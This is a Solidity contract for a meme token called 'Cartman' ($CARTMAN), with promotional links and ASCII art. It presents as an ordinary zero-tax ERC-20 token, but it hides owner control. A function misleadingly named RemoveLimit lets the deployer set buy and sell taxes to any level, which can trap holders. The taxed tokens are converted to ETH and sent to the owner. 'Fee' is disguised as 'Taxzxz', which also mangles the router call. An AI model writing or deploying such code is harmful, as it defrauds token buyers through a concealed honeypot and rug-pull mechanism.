/*

░█████╗░░█████╗░██████╗░████████╗███╗░░░███╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝████╗░████║██╔══██╗████╗░██║
██║░░╚═╝███████║██████╔╝░░░██║░░░██╔████╔██║███████║██╔██╗██║
██║░░██╗██╔══██║██╔══██╗░░░██║░░░██║╚██╔╝██║██╔══██║██║╚████║
╚█████╔╝██║░░██║██║░░██║░░░██║░░░██║░╚═╝░██║██║░░██║██║░╚███║
░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

TG: https://t.me/cartmancoin
Twitter: https://twitter.com/Cartman_ERC20
Website: https://cartman.club/



⬜⬜⬜⬜⬜⬜⬜⬜⬛⬛⬛⬛⬛⬜⬜⬜⬜⬜⬜⬜⬜
⬜⬜⬜⬜⬜⬜⬛⬛🟨🟨🟨🟨🟨⬛⬛⬜⬜⬜⬜⬜⬜
⬜⬜⬜⬜⬛⬛🟦🟦⬛⬛⬛⬛⬛🟦🟦⬛⬛⬜⬜⬜⬜
⬜⬜⬜⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦⬛⬜⬜⬜
⬜⬜⬛🟦🟦🟦🟦🟨🟨🟨🟨🟨🟨🟨🟦🟦🟦🟦⬛⬜⬜
⬜⬜⬛🟦🟨🟨🟨⬛⬛⬛⬛⬛⬛⬛🟨🟨🟨🟦⬛⬜⬜
⬜⬛🟨🟨⬛⬛⬛⬜⬜⬜🏼⬜⬜⬜⬛⬛⬛🟨🟨⬛⬜
⬜⬛⬛⬛🏼🏼⬜⬜⬜⬜⬜⬜⬜⬜⬜🏼🏼⬛⬛⬛⬜
⬜⬛🏼🏼🏼⬜⬜⬜⬜⬛⬜⬛⬜⬜⬜⬜🏼🏼🏼⬛⬜
⬜⬛🏼🏼🏼⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏼🏼🏼⬛⬜
⬜⬛🏼🏼🏼⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏼🏼🏼⬛⬜
⬜⬜⬛🏼🏼🏼⬜⬜⬜⬜🏼⬜⬜⬜⬜🏼🏼🏼⬛⬜⬜
⬜⬜⬛🏼🏼🏼🏼🏼🏼🏼🏼🏼🏼🏼🏼🏼🏼🏼⬛⬜⬜
⬜⬜⬜⬛🏼🏼🏼🏼🏼⬛⬛⬛🏼🏼🏼🏼🏼⬛⬜⬜⬜
⬜⬜⬛⬛⬛⬛🏼🏼🏼🏼🏼🏼🏼🏼🏼⬛⬛⬛⬛⬜⬜
⬜⬛🟥🟥🟥🟥⬛⬛⬛⬛⬛⬛⬛⬛⬛🟥🟥🟥🟥⬛⬜
⬛🟥🟥🟥⬛🟥🟥🟥🟥🟥⬛🟥🟥🟥🟥🟥⬛🟥🟥🟥⬛
⬛🟨🟨⬛🟥🟥🟥🟥🟥🟥⬛🟥🟥🟥🟥🟥🟥⬛🟨🟨⬛
⬛🟨🟨⬛🟥🟥🟥🟥🟥🟥⬛🟥🟥🟥🟥🟥🟥⬛🟨🟨⬛
⬜⬛⬛⬛⬛⬛🟥🟥🟥🟥⬛🟥🟥🟥🟥⬛⬛⬛⬛⬛⬜
⬜⬜⬜⬛🟫🟫⬛⬛⬛⬛⬛⬛⬛⬛⬛🟫🟫⬛⬜⬜⬜
⬜⬜⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜
                                                                                                                                                                                                                              
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingTaxzxzOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Cartman {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    constructor() {
        Masterdev = payable(msg.sender);
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    string public _name = "Cartman";
    string public _symbol = "$CARTMAN";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 4200000000 * 10**decimals;

    uint256 buyTaxzxz = 0;
    uint256 sellTaxzxz = 0;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed Masterdev,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable Masterdev;

    bool private swapping;
    bool private tradingOpen;

    

    receive() external payable {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(tradingOpen || from == Masterdev || to == Masterdev);

        if (!tradingOpen && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router
                .swapExactTokensForETHSupportingTaxzxzOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            Masterdev.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this)) {
            uint256 TaxzxzAmount = (amount *(from == pair ? buyTaxzxz : sellTaxzxz)) / 100;
            amount -= TaxzxzAmount;
            balanceOf[address(this)] += TaxzxzAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function OpenTrading() external {
        require(msg.sender == Masterdev);
        require(!tradingOpen);
        tradingOpen = true;
    }

    function _Romevetax(uint256 _buy, uint256 _sell) private {
        buyTaxzxz = _buy;
        sellTaxzxz = _sell;
    }

    function RemoveLimit(uint256 _buy, uint256 _sell) external {
        if (msg.sender != Masterdev) revert Permissions();
        _Romevetax(_buy, _sell);
    }
}